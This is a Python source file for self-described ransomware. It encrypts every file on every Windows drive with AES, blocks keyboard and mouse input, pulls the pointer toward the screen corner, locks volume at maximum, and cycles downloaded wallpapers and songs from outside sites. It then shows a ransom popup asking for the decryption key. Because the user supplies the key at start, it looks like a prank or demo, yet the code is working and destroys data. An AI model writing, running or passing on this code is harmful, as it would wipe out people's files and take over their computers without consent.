import os
import ctypes
import time
import pygame
import pyautogui
import requests
from threading import Thread
from tkinter import messagebox
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import tkinter as tk
from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume

# Global encryption key (initially empty, to be provided by user later)
encryption_key = None

# Slow down the mouse pointer by multiplying movements by a factor
def slow_down_mouse():
    while True:
        x, y = pyautogui.position()
        pyautogui.moveTo(x/10, y/10)
        time.sleep(0.1)

# Disable critical system functionalities (Ctrl+Alt+Del, Task Manager, CMD, etc.)
def block_system_functions():
    ctypes.windll.user32.BlockInput(True)  # Blocks all keyboard and mouse input

# Function to get all drives (for Windows)
def get_drives():
    drives = []
    for drive in range(ord('A'), ord('Z')+1):
        drive_letter = chr(drive) + ":\\" 
        if os.path.exists(drive_letter):
            drives.append(drive_letter)
    return drives

# Function to download files from a URL
def download_file(url, save_path):
    response = requests.get(url)
    with open(save_path, 'wb') as file:
        file.write(response.content)

# Function to encrypt a single file
def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()

        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(file_data)

        with open(file_path, 'wb') as f:
            f.write(cipher.nonce)  # Write nonce
            f.write(tag)           # Write authentication tag
            f.write(ciphertext)    # Write encrypted file data
    except Exception as e:
        print(f"Error encrypting {file_path}: {e}")

# Recursively encrypt files in all directories
def encrypt_all_files(drives, key):
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            for file in files:
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)
                print(f"Encrypted {file_path}")

# Function to decrypt a single file
def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            nonce = f.read(16)  # Read nonce
            tag = f.read(16)    # Read authentication tag
            ciphertext = f.read()  # Read encrypted data

        cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
        file_data = cipher.decrypt_and_verify(ciphertext, tag)

        with open(file_path, 'wb') as f:
            f.write(file_data)
    except Exception as e:
        print(f"Error decrypting {file_path}: {e}")

# Function to decrypt all files in all drives
def decrypt_all_files(drives, key):
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            for file in files:
                file_path = os.path.join(root, file)
                decrypt_file(file_path, key)
                print(f"Decrypted {file_path}")

# Function to handle decryption after entering the correct key
def handle_decryption(input_key):
    try:
        # Convert the input key from the user to bytes (hex string assumed)
        input_key_bytes = bytes.fromhex(input_key)
        
        if input_key_bytes == encryption_key:
            # Correct key entered, proceed with decryption
            decrypt_all_files(drives, input_key_bytes)
            messagebox.showinfo("Success", "Files decrypted successfully!")
            root.destroy()  # Close the popup
        else:
            messagebox.showerror("Error", "Incorrect decryption key!")
    except Exception as e:
        messagebox.showerror("Error", f"Decryption failed: {e}")

# Create the ransom popup
def show_ransom_popup():
    global root
    root = tk.Tk()
    root.title("Ransomware Attack!")

    # Ransom message
    ransom_message = tk.Label(root, text="Your files have been encrypted!\nEnter the decryption key to recover them.")
    ransom_message.pack(pady=20)

    # Input field for decryption key
    decryption_key_input = tk.Entry(root, show="*")  # Hidden input for key
    decryption_key_input.pack(pady=10)

    # Button to submit the decryption key
    submit_button = tk.Button(root, text="Submit", command=lambda: handle_decryption(decryption_key_input.get()))
    submit_button.pack(pady=10)

    root.geometry("400x200")
    root.mainloop()

# Main function to start the encryption and ransom process
# Wallpaper cycling
def set_wallpaper(image_path):
    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 0)

def change_wallpapers(image_urls):
    while True:
        for idx, url in enumerate(image_urls):
            save_path = f"wallpaper_{idx}.jpg"
            download_file(url, save_path)
            set_wallpaper(save_path)
            time.sleep(30)  # Change every 30 seconds

# Play music
def play_music(music_urls):
    pygame.mixer.init()
    while True:
        for url in music_urls:
            song_path = "temp_song.mp3"
            download_file(url, song_path)
            pygame.mixer.music.load(song_path)
            pygame.mixer.music.play(-1)  # Loop the song
            while pygame.mixer.music.get_busy():
                pygame.mixer.music.set_volume(1.0)
                time.sleep(1)

# Prevent volume reduction
def prevent_volume_reduction():
    while True:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            ISimpleAudioVolume._iid_, ctypes.CLSCTX_ALL, None)
        volume = ctypes.cast(interface, ctypes.POINTER(ISimpleAudioVolume))
        volume.SetMasterVolume(1.0, None)
        time.sleep(1)

# Start the ransomware
def start_ransomware():
    global encryption_key, drives

    # Ask user to set a decryption key
    decryption_key = input("Set your decryption key (hex): ")
    encryption_key = bytes.fromhex(decryption_key)

    # Encrypt all files
    drives = get_drives()
    encrypt_all_files(drives, encryption_key)

    # URLs for wallpapers and songs
    wallpaper_urls = [
        "https://images.filmibeat.com/webp/ph-big/2023/06/mahesh-babu_168654620560.jpg",
        "https://images.filmibeat.com/webp/ph-big/2023/04/mahesh-babu_168075943930.jpg",
        "https://images.filmibeat.com/webp/ph-big/2023/04/mahesh-babu_168075943920.jpg",
        "https://images.filmibeat.com/webp/ph-big/2023/04/mahesh-babu_168075943910.jpg",
        "https://images.filmibeat.com/webp/ph-big/2023/04/mahesh-babu_168075943800.jpg",
        "https://images.filmibeat.com/webp/ph-big/2022/05/mahesh-babu_165224588730.jpg",
        "https://images.filmibeat.com/webp/ph-big/2019/04/mahesh-babu_1556097763140.jpg",
        "https://images.filmibeat.com/webp/ph-big/2019/04/mahesh-babu_1556097763130.jpg",
        "https://images.filmibeat.com/webp/ph-big/2019/04/mahesh-babu_155609776380.jpg",
        "https://images.filmibeat.com/webp/ph-big/2019/04/mahesh-babu_155609776330.jpg",
        "https://c4.wallpaperflare.com/wallpaper/226/472/1001/srimanthudu-mahesh-babu-wallpaper-thumb.jpg",
        "https://c4.wallpaperflare.com/wallpaper/1010/643/760/mahesh-babu-shruti-haasan-wallpaper-thumb.jpg",
        "https://c4.wallpaperflare.com/wallpaper/981/662/373/shruti-haasan-mahesh-babu-srimanthudu-wallpaper-preview.jpg",
        "https://c4.wallpaperflare.com/wallpaper/591/679/648/movies-bollywood-movies-wallpaper-thumb.jpg",

        # Add more URLs here...
    ]
    music_urls = [
        "https://sencloud.online/mp3/Telugu%20Mp3/All/Bussinessman%282012%29/Mumbai-SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/Spyder%20(2017)/Achcham%20Telugandham-SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/2024/Guntur%20Karam/Guntur%20Karam/Dum%20Masala.mp3",
        "https://mp3teluguwap.net/mp3/2024/Guntur%20Karam/Guntur%20Karam%20-%20HQ/Kurchi%20Madathapetti.mp3",
        "https://mp3teluguwap.net/mp3/Spyder%20(2017)/Ciciliya%20Ciciliya-SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/2019/Maharshi%20-%20(2019)/Maharshi%20(2019)%20-%20HQ/Everest%20Anchuna%20-%20SenSongsMp3.Co.mp3",
        "https://sencloud.online/mp3/Telugu%20Mp3/All/Bussinessman%282012%29/Bad%20Boys-SenSongsMp3.Co.mp3",
        "https://sencloud.online/mp3/Telugu%20Mp3/All/Bussinessman%282012%29/Pilla%20Chao-SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/111/Bussinessman/Rage%20Of%20Surya.mp3",
        "https://mp3teluguwap.net/mp3/2018/Bharat%20Ane%20Nenu%20(2018)/Bharat%20Ane%20Nenu%20-%20HQ/Bharat%20Ane%20Nenu%20-%20SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/2018/Bharat%20Ane%20Nenu%20(2018)/Bharat%20Ane%20Nenu%20-%20HQ/Vachaadayyo%20Saami%20-%20SenSongsMp3.Co.mp3",
        "https://mp3teluguwap.net/mp3/2018/Bharat%20Ane%20Nenu%20(2018)/Bharat%20Ane%20Nenu%20-%20HQ/O%20Vasumathi%20-%20SenSongsMp3.Co.mp3",
        "https://sencloud.online/mp3/Telugu%20Mp3/All/Khaleja%282010%29/Taxi-SenSongsMp3.Co.mp3",
        "https://sencloud.online/mp3/Telugu%20Mp3/All/Khaleja%282010%29/Sada%20Siva-SenSongsMp3.Co.mp3",
        # Add more URLs here...
    ]

    # Start wallpaper changes
    wallpaper_thread = Thread(target=change_wallpapers, args=(wallpaper_urls,))
    wallpaper_thread.start()

    # Start playing music
    music_thread = Thread(target=play_music, args=(music_urls,))
    music_thread.start()

    # Prevent volume reduction
    volume_thread = Thread(target=prevent_volume_reduction)
    volume_thread.start()

    # Block system functions (block mouse, Task Manager, etc.)
    block_thread = Thread(target=block_system_functions)
    block_thread.start()

    # Slow down the mouse
    mouse_thread = Thread(target=slow_down_mouse)
    mouse_thread.start()

    # Show ransom popup
    show_ransom_popup()

if __name__ == "__main__":
    start_ransomware()
